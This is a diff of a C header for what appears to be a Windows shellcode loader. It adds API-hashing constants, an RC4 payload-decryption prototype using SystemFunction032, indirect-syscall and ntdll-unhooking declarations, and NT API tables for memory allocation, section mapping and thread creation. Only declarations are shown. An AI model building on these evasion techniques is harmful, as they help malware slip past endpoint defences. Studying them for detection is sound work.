@@ -1,6 +1,5 @@
 #pragma once
 #include <Windows.h>
-#include "Structs.h"
 #include "typedefs.h"
 
 #define DEREF( name )		*(	UINT_PTR	*)	(name)
@@ -8,6 +7,9 @@
 #define DEREF_32( name )	*(	DWORD		*)	(name)
 #define DEREF_16( name )	*(	WORD		*)	(name)
 #define DEREF_8( name )		*(	BYTE		*)	(name)
+
+#define KEY_SIZE 16
+#define HINT_BYTE 0x61
 
 #define SEED        0xEDB88320
 #define RANGE       255
@@ -36,13 +38,21 @@
 #define win32udll_CRC32          0x1C630B12
 #define WIN32UDLL_CRC32          0x270D2BDA
 
-unsigned int crc32h(char* message);
+#define SystemFunction032_CRC32         0x9874186F
+#define NTDLLDLL_CRC32  0x6030EF91
+#define LdrLoadDll_CRC32        0x183679F2
+
+unsigned int _crc32h(char* message);
+SIZE_T	 _CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
+SIZE_T   _StrlenA(LPCSTR String);
+SIZE_T   _StrlenW(LPCWSTR String);
+UINT32   _CopyDotStr(PCHAR String);
 VOID	 _RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
 PVOID	 _memcpy(PVOID Destination, CONST PVOID Source, SIZE_T Length);
 wchar_t* _strcpy(wchar_t* dest, const wchar_t* src);
 wchar_t* _strcat(wchar_t* dest, const wchar_t* src);
 
-#define HASH(API) crc32h((char*)API)
+#define HASH(API) _crc32h((char*)API)
 #define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))
 
 PTEB RtlGetThreadEnvironmentBlock();
@@ -50,7 +60,60 @@ BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImage
 
 HMODULE GetModuleHandleH(DWORD dwModuleHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
+HMODULE LoadLibraryH(LPSTR DllName);
 
 BOOL IniUnhookDirectCalls();
 BOOL IniUnhookIndirectSyscalls();
 BOOL RefreshAllDlls();
+
+BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
+
+typedef struct _NT_SYSCALL
+{
+	DWORD dwSSn;                    // syscall number
+	DWORD dwSyscallHash;            // syscall hash value
+	PVOID pSyscallAddress;          // syscall address
+	PVOID pSyscallInstAddress;      // address of a random 'syscall' instruction in ntdll
+
+}NT_SYSCALL, * PNT_SYSCALL;
+
+typedef struct _NTDLL_CONFIG
+{
+	PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions
+	PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions
+	PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions
+	DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll
+	ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs
+
+}NTDLL_CONFIG, * PNTDLL_CONFIG;
+
+typedef struct _NTAPI_FUNC
+{
+	NT_SYSCALL	NtAllocateVirtualMemory;
+	NT_SYSCALL	NtProtectVirtualMemory;
+	NT_SYSCALL	NtCreateThreadEx;
+	NT_SYSCALL	NtWaitForSingleObject;
+	NT_SYSCALL  NtOpenSection;
+	NT_SYSCALL  NtCreateSection;
+	NT_SYSCALL  NtMapViewOfSection;
+	NT_SYSCALL  NtUnmapViewOfSection;
+	NT_SYSCALL  NtOpenThread;
+	NT_SYSCALL  NtSuspendThread;
+	NT_SYSCALL  NtResumeThread;
+	NT_SYSCALL  NtClose;
+
+}NTAPI_FUNC, * PNTAPI_FUNC;
+
+typedef struct _DIRECT_CALLS {
+
+	fnCreateToolhelp32Snapshot	pCreateToolhelp32Snapshot;
+	fnThread32First				pThread32First;
+	fnThread32Next				pThread32Next;
+	fnCloseHandle				pCloseHandle;
+
+}WINAPI_FUNC, * PWINAPI_FUNC;
+
+typedef enum THREADS {
+	SUSPEND_THREADS,
+	RESUME_THREADS
+};
